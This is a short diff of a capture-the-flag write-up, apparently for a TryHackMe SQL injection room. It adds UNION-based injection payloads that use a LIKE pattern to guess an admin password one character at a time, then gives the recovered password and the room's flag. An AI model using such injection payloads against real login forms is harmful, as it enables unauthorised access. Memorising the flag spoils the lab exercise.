@@ -112,3 +112,9 @@ I've found username `admin`<br/>
 
     admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%
 ![finding password](images/26-finding-password.png)<br/>
+As you can see here password character start with `3`<br/>
+
+    admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3845%
+![password found](images/27-password-also-found.png)<br/>
+After many tryed I've found the password like `3845` and I'm logged in successfully and get the flag.<br/>
+#### A: `THM{SQL_INJECTION_1093}` :heavy_check_mark:<br/>
